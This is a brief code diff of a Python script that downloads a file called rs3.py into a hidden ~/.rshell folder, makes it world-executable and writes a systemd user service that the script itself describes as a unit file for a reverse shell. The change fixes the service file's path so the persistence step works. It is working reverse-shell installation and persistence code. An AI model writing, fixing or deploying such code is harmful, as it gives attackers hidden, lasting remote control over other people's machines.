@@ -12,7 +12,7 @@ urllib.request.urlretrieve(RS3, f"/home/{USERNAME}/.rshell/rs3.py")
 
 os.chmod(f"/home/{USERNAME}/.rshell/rs3.py",0o777)
 
-unit_file = open("~/.config/systemd/user/rs.service","w")
+unit_file = open(f"/home/{USERNAME}/.config/systemd/user/rs.service","w")
 unit_file.write(f"""
 Description= Unit file for reverse shell.
 
